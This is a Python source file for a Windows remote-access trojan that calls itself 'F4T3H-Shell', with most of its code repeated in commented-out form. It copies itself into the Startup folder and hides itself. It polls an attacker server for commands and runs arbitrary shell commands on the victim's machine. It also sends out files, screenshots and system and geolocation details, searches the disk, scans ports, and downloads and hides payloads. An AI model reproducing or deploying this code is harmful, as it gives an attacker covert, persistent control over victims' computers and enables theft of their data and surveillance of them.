
import os
import re
import time
import uuid
import json
import socket
import random
import shutil
import getpass
import requests
import platform
import pyautogui
import subprocess


HOST = "XHOST"
PORT = int("XPORT")
ADDRESS = f"http://{HOST}:{PORT}"
EXTERNAL_IP_ADDRESS = requests.get('https://api.ipify.org').text
TIME_TO_RECONNECT = random.randint(0, 5)
USER_NAME = getpass.getuser()
DOWNLOAD_PATH = "C:\\Users\\{}\\Desktop\\".format(USER_NAME)
STARTUP_PATH = r"C:\Users\{0}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup".format(USER_NAME)
currant_wd = os.path.dirname(__file__)
print (currant_wd)


# copy to startup
def auto_run():
    """[Copy the shell to the startup directory <<Persistence>>]"""

    path = STARTUP_PATH
    file_name = __file__.split("\\")[-1]    # the currane file/script name
    file_in_startup = path + "\\" + file_name


    if os.path.isfile(file_in_startup):
        # inform the attacker
        requests.post(url = ADDRESS, data = f"[+] F4T3H-Shell is already @[{path}]")
    else:
        try:
            # read the currant file content
            with open(__file__,"rb") as file:
                content = file.read()
            # write the file in the startup directory
            with open(file_in_startup,"wb") as final:
                final.write(content)
            # check again
            if os.path.isfile(file_in_startup):
                os.chdir(path) # change directory to the startup directory
                os.system(f'attrib +h "{file_name}"') # make the shell hidden
                requests.post(url = ADDRESS, data = f"[+] Now, F4T3H-Shell is hidding @[{path}]")
        except Exception as error:
            requests.post(url = ADDRESS, data = f"[-] Error msg: {str(error)}")


def port_scanner(ip, ports):
    """[scan spacific ip address with N number of ports number]

    Command Example:
        >> scan 127.0.0.1:80,50,8080

    Args:
        ip ([string])       : [IP address that you want to scan it]
        ports ([list])      : [ports number to scan each one of them]
    """
    scan_result = f"[+] Scan Result of ({ports}) ports"
    for port in ports.split(","):
        socket_obj = socket.socket()
        result = socket_obj.connect_ex((ip, int(port)))
        if result == 0:
            scan_result += f"\n[+] Port {port} is open"
        else:
            scan_result += f"\n[-] Port {port} is close"
    requests.post(url = ADDRESS, data = scan_result)


def snapshot():
    """[tacking screenshot from victim pc then send it to the attacker machine]"""
    # get screenshot object
    my_screenshot = pyautogui.screenshot()
    screen_name = "client_screen.png"
    # save the screenshot
    my_screenshot.save(screen_name)
    if os.path.exists(currant_wd):
        # redirect to the store address @ serevr side
        url = ADDRESS + "/store"
        files = {'file': open(currant_wd + f"/{screen_name}", 'rb')}
        # post screenshot to the server
        requests.post(url, files = files)
    os.remove(screen_name)


def ip_info():
    """[getting ip information then send it to the attacker]
    
    # here i have used geolocation.py script
    # from: https://github.com/dscciem/Pentesting-and-Hacking-Scripts/blob/master/Geolocation/geolocation.py
    # thanks Amit366 <3"""

    try:
        ip_api = f"https://ipapi.co/{EXTERNAL_IP_ADDRESS}/json/"
        api_response = requests.get(ip_api)
        ip_info = json.loads(api_response.content)
        requests.post(url = ADDRESS, data = ip_info)
    except:
        print("lpl")


def system_information():
    """[getting basic system information & to get more info user systeminfo]"""

    info = f"""
    ========== Target Information ==========
    [+] System Type         : {platform.uname().system}
    [+] Currant login User  : {platform.uname().node}
    [+] System Release      : {platform.uname().release}
    [+] System Version      : {platform.uname().version}
    [+] Machine Architectur : {platform.uname().machine}
    [+] External IP Address : {EXTERNAL_IP_ADDRESS}
    [+] MAC Address         : {':'.join(re.findall('..', '%012x' % uuid.getnode()))}
    [+] Shell Path          : {__file__}
    ========================================\n"""
    requests.post(url = ADDRESS, data = info)


def find_with(path, extension):
    r"""[find files with x extension like PDFs,PNGs...etc]

    Command Example:
        >> find pdf@c:\

    Args:
        path ([string])         : [the path to search in like C:\  D:\]
        extension ([string])    : [the extension like png,jpg]
    """
    
    results = "" # accumulator variable
    requests.post(url = ADDRESS, data = f"[+] Searching about [.{extension}] @ {path}. . .\n")
    for directory, _, files in os.walk(path):
        for file in files:
            if file.endswith(f".{extension}"):
                results = results + "\n" + os.path.join(directory, file)
    if results == "":
        requests.post(url = ADDRESS, data = "[-] No {0}@{1} Directory!".format(extension, path))
    else:
        requests.post(url = ADDRESS, data = "[+] Final Results:\n")
        requests.post(url = ADDRESS, data = results)
        requests.post(url = ADDRESS, data = "\n[+] I hope i was helpful to you <3\n")


def cmd(command):
    """[running commands throught the terminal/cmd]

    Args:
        command ([string]): [cmd command like ipconfig]

    Returns:
        command_stdout([bytes])      :[command result if it runned successfully]
        command_stderr([bytes])      :[command result if it runned with error]
    """

    # passing commands to shell
    command_result = subprocess.Popen(command,
                                    shell=True,               # execute throght the shell/cmd/terminal.
                                    stdin=subprocess.PIPE,    # for getting input. 
                                    stdout=subprocess.PIPE,   # for getting outputs. 
                                    stderr=subprocess.PIPE)   # for getting errors.
    # reading std.out/err
    command_stdout = command_result.stdout.read()
    command_stderr = command_result.stderr.read()
    # return pair of std.out/err
    return (command_stdout, command_stderr)


def download(file_name, url):
    """[downloading files from the attcker server]

    Args:
        file_name ([type])      :[the name of file that will appear at target PC]
        url ([type])            :[the url from the attacker server to download it]
    """

    path = DOWNLOAD_PATH
    try:
        if os.path.isdir(path):
            os.chdir(path)
            # the command to download file from the server
            command = f"curl.exe --output {file_name} --url {url}"
            # cmd returns pair (out, err)
            result = cmd(command)
            check_file = f"{path}\\{file_name}"
            while True:
                if os.path.isfile(check_file):
                    # check if the file downloaded
                    requests.post(url = ADDRESS, data = result[0])
                    requests.post(url = ADDRESS, data = result[1])
                    requests.post(url = ADDRESS, data = f"[+] File was uploaded successfully! @{path}")
                    # hide the file
                    cmd(f"attrib +h {file_name}")
                    break # exit the loop
                else:
                    # wait a second
                    time.sleep(1)
                    requests.post(url = ADDRESS, data = "[-] Wait Seccond plz!")
            
    except Exception as error:
        requests.post(url = ADDRESS, data = str(error).encode())


def main():
    try:
        auto_run()
    except:
        requests.post(url = ADDRESS, data = '[-] Unable to copy to startup directory'.encode())

    while True:
        try:
            command = requests.get(ADDRESS)

            if 'end' in command:
                break

            elif 'get' in command:
                # get files from the clint
                _, path = command.split(" ")
                if os.path.exists(path):
                    # redirect to the store file @ serevr side
                    url = ADDRESS + "/store"
                    files = {'file': open(path, 'rb')}
                    requests.post(url, files = files)
                else:
                    # file doesn't exist
                    requests.post(url = ADDRESS, data = '[-] Unable to find the file!'.encode())

            # file navigation
            elif "cd" in command:
                _, directory = command.split(" ")
                try:
                    os.chdir(directory)
                    cwd = f"[+] CWD : {os.getcwd()}"
                    requests.post(url = ADDRESS, data = cwd)
                except Exception as error:
                    requests.post(url = ADDRESS, data = str(error))



            elif "snapshot" in command:
                # calling snapshot function
                snapshot()


            elif "scan" in command:
                _, com = command.split(" ")
                com = com.split(":")
                ip = com[0]
                ports = com[1]
                # calling scanner function
                port_scanner(ip, ports)

            

            elif "information" in command:
                # calling system_information function
                system_information()


            elif "find" in command:
                # delete find keyword
                command = command[5:]
                # split the command for extension and path
                extension, path = command.split("@")
                # calling find function
                find_with(path, extension)


            elif "geo_ip" in command:
                # calling ip geolocation function
                ip_info()

            elif "upload" in command:
                file_name, url = command[7:].split("@")
                # download files to this "victim" PC 
                download(file_name, url)

            elif "kill" in command:
                pass

            else:
                # pass command to cmd/terminal to be executed
                result_out, result_error = cmd(command)
                # POST the command result to the server
                requests.post(url = ADDRESS, data = result_out)
                requests.post(url = ADDRESS, data = result_error)
        except:
            # try to reconnect
            time.sleep(TIME_TO_RECONNECT)


if __name__ == "__main__":
    # calling main function
    while True:
        main()
    




class Files:
    pass


class Networking:
    pass


# def port_scanner(ip, ports):
#     scan_result = f"[+] Scan Result of ({ports}) ports"
#     for port in ports.split(","):
#         socket_obj = socket.socket()
#         result = socket_obj.connect_ex((ip, int(port)))
#         if result == 0:
#             scan_result += f"\n[+] Port {port} is open"
#         else:
#             scan_result += f"\n[-] Port {port} is close"
#     requests.post(url = ADDRESS, data = scan_result)

# def ip_info():
#     try:
#         ip_api = f"https://ipapi.co/{EXTERNAL_IP_ADDRESS}/json/"
#         api_response = requests.get(ip_api)
#         ip_info = json.loads(api_response.content)
#         ip_result = f"""
#         =====================================
#         IP : {ip_info['ip']}
#         City : {ip_info['city']}
#         Region : {ip_info['region']}
#         Region Code : {ip_info['region_code']}
#         Country : {ip_info['country']}
#         Country Code : {ip_info['country_code']}
#         Country Capital : {ip_info['country_capital']}
#         Country Name : {ip_info['country_name']}
#         Latitude : {ip_info['latitude']}
#         Longitude : {ip_info['longitude']}
#         Timezone : {ip_info['timezone']}
#         Country Calling Code : {ip_info['country_calling_code']}
#         Currency : {ip_info['currency']}
#         Currency Name : {ip_info['currency_name']}
#         Country Language : {ip_info['languages']}
#         Country Area : {ip_info['country_area']} KM
#         Country Population : {int(ip_info['country_population'])} Person
#         Asn : {ip_info['asn']}
#         ISP-ORG : {ip_info['org']}
#         =====================================\n"""
#         print(ip_result)
#         requests.post(url = ADDRESS, data = ip_result)
#     except:
#         requests.post(url = ADDRESS, data = "[-] Error in IP-info function")


# def system_information():
#     system_info = f"""
#     ========== Target Information ==========
#     [+] System Type         : {platform.uname().system}
#     [+] Currant login User  : {platform.uname().node}
#     [+] System Release      : {platform.uname().release}
#     [+] System Version      : {platform.uname().version}
#     [+] Machine Architectur : {platform.uname().machine}
#     [+] External IP Address : {EXTERNAL_IP_ADDRESS}
#     [+] MAC Address         : {':'.join(re.findall('..', '%012x' % uuid.getnode()))}
#     [+] Shell Path          : {__file__}
#     ========================================\n"""
#     requests.post(url = ADDRESS, data = system_info)


# def find_with(path, extension):
#     r"""[find files with x extension like PDFs,PNGs...etc]

#     Command Example:
#         >> find pdf@c:\

#     Args:
#         path ([string])         : [the path to search in like C:\  D:\]
#         extension ([string])    : [the extension like png,jpg]
#     """
    
#     results = "" # accumulator variable
#     requests.post(url = ADDRESS, data = f"[+] Searching about [.{extension}] @ {path}. . .\n")
#     for directory, _, files in os.walk(path):
#         for file in files:
#             if file.endswith(f".{extension}"):
#                 results = results + "\n" + os.path.join(directory, file)
#     if results == "":
#         requests.post(url = ADDRESS, data = "[-] No {0}@{1} Directory!".format(extension, path))
#     else:
#         requests.post(url = ADDRESS, data = "[+] Final Results:\n")
#         requests.post(url = ADDRESS, data = results)
#         requests.post(url = ADDRESS, data = "\n[+] I hope i was helpful to you <3\n")


# def cmd(command):
#     """[running commands throught the terminal/cmd]

#     Args:
#         command ([string]): [cmd command like ipconfig]

#     Returns:
#         command_stdout([bytes])      :[command result if it runned successfully]
#         command_stderr([bytes])      :[command result if it runned with error]
#     """

#     # passing commands to shell
#     command_result = subprocess.Popen(command,
#                                     shell=True,               # execute throght the shell/cmd/terminal.
#                                     stdin=subprocess.PIPE,    # for getting input. 
#                                     stdout=subprocess.PIPE,   # for getting outputs. 
#                                     stderr=subprocess.PIPE)   # for getting errors.
#     # reading std.out/err
#     command_stdout = command_result.stdout.read()
#     command_stderr = command_result.stderr.read()
#     # return pair of std.out/err
#     return (command_stdout, command_stderr)


# def download(file_name, url):
#     """[downloading files from the attcker server]

#     Args:
#         file_name ([type])      :[the name of file that will appear at target PC]
#         url ([type])            :[the url from the attacker server to download it]
#     """

#     path = DOWNLOAD_PATH
#     try:
#         if os.path.isdir(path):
#             os.chdir(path)
#             # the command to download file from the server
#             command = f"curl.exe --output {file_name} --url {url}"
#             # cmd returns pair (out, err)
#             result = cmd(command)
#             check_file = f"{path}\\{file_name}"
#             while True:
#                 if os.path.isfile(check_file):
#                     # check if the file downloaded
#                     requests.post(url = ADDRESS, data = result[0])
#                     requests.post(url = ADDRESS, data = result[1])
#                     requests.post(url = ADDRESS, data = f"[+] File was uploaded successfully! @{path}")
#                     # hide the file
#                     cmd(f"attrib +h {file_name}")
#                     break # exit the loop
#                 else:
#                     # wait a second
#                     time.sleep(1)
#                     requests.post(url = ADDRESS, data = "[-] Wait Seccond plz!")
            
#     except Exception as error:
#         requests.post(url = ADDRESS, data = str(error).encode())


# def main():
#     try:
#         adding_to_startup()
#     except:
#         requests.post(url = ADDRESS, data = '[-] Unable to copy to startup directory'.encode())

#     while True:
#         try:
#             command = requests.get(ADDRESS)

#             if 'end' in command:
#                 break

#             elif 'get' in command:
#                 # get files from the clint
#                 _, path = command.split(" ")
#                 if os.path.exists(path):
#                     # redirect to the store file @ serevr side
#                     url = ADDRESS + "/store"
#                     files = {'file': open(path, 'rb')}
#                     requests.post(url, files = files)
#                 else:
#                     # file doesn't exist
#                     requests.post(url = ADDRESS, data = '[-] Unable to find the file!'.encode())

#             # file navigation
#             elif "cd" in command:
#                 _, directory = command.split(" ")
#                 try:
#                     os.chdir(directory)
#                     cwd = f"[+] CWD : {os.getcwd()}"
#                     requests.post(url = ADDRESS, data = cwd)
#                 except Exception as error:
#                     requests.post(url = ADDRESS, data = str(error))



#             elif "snapshot" in command:
#                 # calling snapshot function
#                 pass


#             elif "scan" in command:
#                 _, com = command.split(" ")
#                 com = com.split(":")
#                 ip = com[0]
#                 ports = com[1]
#                 # calling scanner function
#                 port_scanner(ip, ports)

            

#             elif "information" in command:
#                 # calling system_information function
#                 system_information()


#             elif "find" in command:
#                 # delete find keyword
#                 command = command[5:]
#                 # split the command for extension and path
#                 extension, path = command.split("@")
#                 # calling find function
#                 find_with(path, extension)


#             elif "geo_ip" in command:
#                 # calling ip geolocation function
#                 ip_info()

#             elif "upload" in command:
#                 file_name, url = command[7:].split("@")
#                 # download files to this "victim" PC 
#                 download(file_name, url)

#             elif "kill" in command:
#                 pass

#             else:
#                 # pass command to cmd/terminal to be executed
#                 result_out, result_error = cmd(command)
#                 # POST the command result to the server
#                 requests.post(url = ADDRESS, data = result_out)
#                 requests.post(url = ADDRESS, data = result_error)
#         except:
#             # try to reconnect
#             time.sleep(TIME_TO_RECONNECT)
